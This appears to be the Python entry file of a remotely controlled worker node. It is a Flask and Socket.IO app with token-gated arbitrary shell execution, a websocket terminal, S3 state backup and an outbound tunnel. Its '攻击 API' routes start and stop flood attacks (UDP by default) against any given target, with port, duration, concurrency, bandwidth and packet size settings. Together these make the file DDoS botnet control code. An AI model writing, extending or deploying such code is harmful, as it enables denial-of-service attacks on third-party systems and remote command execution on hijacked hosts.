# -*- coding: utf-8 -*-
"""
Worker Flask App + 路由 + WSS 终端 + 启动入口

两阶段启动：
  阶段1（立即）：init_instance → 隧道 → Flask（保证域名可访问）
  阶段2（后台）：数据恢复 → 系统配置 → 进程恢复 → MCP → Leader → 后台循环
"""
import os
import io
import json
import time
import select
import signal
import threading
import subprocess
import urllib.request

from flask import Flask, request, jsonify
from flask_socketio import SocketIO

import config
import log
from core import lock as core_lock
from core import status as core_status
from core.s3 import S3Pool
from core import releases
from worker import state, persistence, terminal, attack
from worker.tunnel import TunnelManager
from worker.process.manager import ProcessManager
from worker.process import api as proc_api
from worker.boot import deferred_init
from worker.loops import start_loops

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
                    ping_timeout=60, ping_interval=25)
logger = log.setup_logger("worker")

JOB_STATE = {"last_url": "", "load_status": state.load_status}


def init_instance():
    """读取实例配置。S3 优先，Releases 降级。"""
    cfg = {}
    if state.s3pool and state.s3pool.is_ready():
        data = state.s3pool.get_meta_json(
            f"meta/inst-config/{config.INSTANCE_ID}.json", default=None)
        if data and isinstance(data, dict):
            cfg = data
            logger.info(f"[init] 从 S3 加载实例配置: {config.INSTANCE_ID}")
    if not cfg:
        cfg = releases.load_json_enc(f"inst-{config.INSTANCE_ID}.json.enc", default={})
        if cfg:
            logger.info(f"[init] 从 Releases 加载实例配置: {config.INSTANCE_ID}")
    state.inst_cfg = config.InstanceConfig(config.INSTANCE_ID, cfg)
    logger.info(f"[init] 实例 {config.INSTANCE_ID}: host={state.inst_cfg.tunnel_host}")
    return state.inst_cfg


# ==================== 认证 ====================
def _check(data=None):
    token = ""
    if isinstance(data, dict):
        token = data.get("token", "")
    if not token:
        token = request.headers.get("Authorization", "").replace("Bearer ", "").strip()
    if not token:
        token = request.args.get("token", "")
    return bool(config.EXEC_TOKEN) and token == config.EXEC_TOKEN


# ==================== 路由 ====================
@app.route("/")
def index():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job=core_lock.JOB_ID,
                   elapsed=core_status.elapsed(),
                   leader=state.leader.is_leader if state.leader else False,
                   url=JOB_STATE["last_url"])


@app.route("/api/health")
def health():
    return jsonify(ok=True, instance=config.INSTANCE_ID, elapsed=core_status.elapsed())


@app.route("/api/status")
def status():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job_id=core_lock.JOB_ID,
                   elapsed=core_status.elapsed(),
                   leader=state.leader.is_leader if state.leader else False,
                   url=JOB_STATE["last_url"], source=state.load_status,
                   tunnel_host=state.inst_cfg.tunnel_host if state.inst_cfg else config.TUNNEL_HOST)


@app.route("/api/logs")
def logs():
    limit = max(10, min(int(request.args.get("limit", 300)), 2000))
    return jsonify(ok=True, logs=log.get_logs(
        limit=limit, level=request.args.get("level"),
        module=request.args.get("module"), keyword=request.args.get("keyword")),
        stats=log.get_stats())


@app.route("/api/resource")
def resource():
    stats = log.get_resource_stats()
    stats["elapsed"] = core_status.elapsed()
    return jsonify(ok=True, **stats)


@app.route("/api/exec", methods=["POST"])
def exec_cmd():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 403
    cmd = (data.get("cmd") or "").strip()
    if not cmd or len(cmd) > 2000:
        return jsonify(ok=False, error="命令为空或过长"), 400
    timeout = max(1, min(int(data.get("timeout", 30)), 600))
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return jsonify(ok=True, code=proc.returncode,
                       stdout=proc.stdout[-4000:], stderr=proc.stderr[-2000:])
    except subprocess.TimeoutExpired:
        return jsonify(ok=False, error=f"超时({timeout}s)"), 500
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


@app.route("/api/backup", methods=["POST"])
def backup():
    if not _check():
        return jsonify(ok=False, error="未授权"), 401
    if state.leader and not state.leader.is_leader:
        return jsonify(ok=False, error="备份节点"), 503
    try:
        db_size, _ = persistence.backup_database(state.inst_cfg)
        res = persistence.backup_files(state.inst_cfg)
        return jsonify(ok=True, db_size=db_size, files_size=res[0] if res else 0)
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


_backup_lock = threading.Lock()
_backup_running = False


@app.route("/api/backup/now", methods=["POST"])
def backup_now():
    global _backup_running
    if not _check():
        return jsonify(ok=False, error="未授权"), 403
    with _backup_lock:
        if _backup_running:
            return jsonify(ok=False, error="备份进行中"), 409
        _backup_running = True
    try:
        t0 = time.time()
        db_size, _ = persistence.backup_database(state.inst_cfg)
        res = persistence.backup_files(state.inst_cfg)
        if state.proc_mgr:
            state.proc_mgr.snapshot(reason="manual_now")
        elapsed = time.time() - t0
        if state.s3pool:
            state.s3pool.save_state()
        logger.info(f"[backup-now] 完成 ({elapsed:.1f}s)")
        return jsonify(ok=True, db_size=db_size,
                       files_size=res[0] if res else 0, elapsed=round(elapsed, 1))
    except Exception as e:
        logger.error(f"[backup-now] 失败: {e}")
        return jsonify(ok=False, error=str(e)), 500
    finally:
        _backup_running = False


@app.route("/api/term/screen")
def term_screen():
    return jsonify(ok=True, screen=terminal.get_screen(request.args.get("session", "")))


# ==================== 攻击 API ====================
@app.route("/api/attack/start", methods=["POST"])
def attack_start():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    if attack.attack_state["running"]:
        return jsonify(ok=False, error="已有攻击在运行"), 409
    target = (data.get("target") or "").strip()
    if not target:
        return jsonify(ok=False, error="target 必填"), 400
    ok, msg = attack.start_attack(
        target=target, mode=(data.get("type") or "udp").strip(),
        port=int(data.get("port", 80)), duration=int(data.get("duration", 60)),
        concurrency=int(data.get("concurrency", 100)),
        bandwidth=int(data.get("bandwidth", 0)),
        packet_size=int(data.get("packet_size", 1024)))
    return jsonify(ok=ok, msg=msg) if ok else jsonify(ok=False, error=msg), 500


@app.route("/api/attack/stop", methods=["POST"])
def attack_stop():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    ok, msg = attack.stop_attack()
    return jsonify(ok=ok, msg=msg)


@app.route("/api/attack/status")
def attack_status():
    return jsonify(ok=True, **attack.attack_status())


# ==================== WSS 终端 ====================
def _pty_reader(session_key, sid):
    sess = terminal.SESSIONS.get(session_key)
    if not sess:
        return
    try:
        while sess.attached:
            r, _, _ = select.select([sess.fd], [], [], 1.0)
            if r:
                data = sess.read_output()
                if data is None:
                    break
                if data:
                    sess.feed(data)
                    socketio.emit("output", data, to=sid)
            else:
                wpid, status = os.waitpid(sess.pid, os.WNOHANG)
                if wpid == sess.pid:
                    socketio.emit("exit", {"code": status}, to=sid)
                    break
    except Exception:
        pass


@socketio.on("connect")
def ws_connect(auth):
    token = ""
    session_key = ""
    if isinstance(auth, dict):
        token = auth.get("token", "")
        session_key = auth.get("session", "")
    if not config.EXEC_TOKEN or token != config.EXEC_TOKEN:
        return False
    if not session_key:
        session_key = f"{config.INSTANCE_ID}-{core_lock.JOB_ID}"
    sess = terminal.get_or_create_session(session_key)
    state._sid_to_key[request.sid] = session_key
    threading.Thread(target=_pty_reader, args=(session_key, request.sid), daemon=True).start()
    socketio.emit("session", {"session_key": session_key}, to=request.sid)


@socketio.on("input")
def ws_input(data):
    session_key = state._sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if sess:
        sess.write_input(data if isinstance(data, bytes) else data.encode())


@socketio.on("resize")
def ws_resize(data):
    session_key = state._sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if sess:
        try:
            sess.resize(int(data.get("rows", 24)), int(data.get("cols", 80)))
        except Exception:
            pass


@socketio.on("disconnect")
def ws_disconnect():
    session_key = state._sid_to_key.pop(request.sid, "")
    if session_key:
        terminal.detach_session(session_key)


# ==================== 优雅关闭 ====================
def _signal_handler(signum, frame):
    logger.warning(f"[shutdown] 信号 {signum}，最终快照")
    try:
        if state.proc_mgr:
            state.proc_mgr.final_snapshot()
        persistence.backup_database(state.inst_cfg)
        persistence.backup_files(state.inst_cfg)
        if state.mcp_mgr:
            state.mcp_mgr.stop()
        if state.s3pool:
            state.s3pool.save_state()
    except Exception as e:
        logger.error(f"[shutdown] 备份失败: {e}")
    os._exit(0)


# ==================== 启动 ====================
def run():
    t0 = time.time()
    logger.info(f"[boot] === Worker 启动: {config.INSTANCE_ID} ===")

    # S3 初始化
    bootstrap = os.environ.get("S3_BOOTSTRAP", "")
    if bootstrap:
        state.s3pool = S3Pool(bootstrap, config.S3_ENDPOINT, config.S3_REGION)
        if state.s3pool.init():
            persistence.set_s3pool(state.s3pool)
            logger.info("[boot] S3 池初始化成功")
        else:
            logger.error("[boot] S3 池初始化失败，降级 Releases")
            state.s3pool = None
    else:
        logger.warning("[boot] 无 S3_BOOTSTRAP，仅用 Releases")

    # 阶段1：最小启动
    init_instance()
    os.makedirs(config.FILES_DIR, exist_ok=True)
    os.makedirs(config.LOGS_DIR, exist_ok=True)
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)

    state.tunnel_mgr = TunnelManager(state.inst_cfg)
    JOB_STATE["last_url"] = state.tunnel_mgr.url
    state.tunnel_mgr.start_async()
    logger.info(f"[boot] 隧道已异步启动: {state.tunnel_mgr.url} ({time.time()-t0:.1f}s)")

    # 进程管理器 + API
    state.proc_mgr = ProcessManager(state.inst_cfg, state.s3pool)
    proc_api.init_process_api(state.proc_mgr)
    app.register_blueprint(proc_api.bp)

    # 阶段2：延迟初始化（后台线程）
    threading.Thread(target=deferred_init, daemon=True).start()

    # Flask 服务（阻塞）
    log.request_logger(app)
    logger.info(f"[boot] Flask 端口 {config.PORT} ({time.time()-t0:.1f}s)")
    socketio.run(app, host="0.0.0.0", port=config.PORT, allow_unsafe_werkzeug=True)
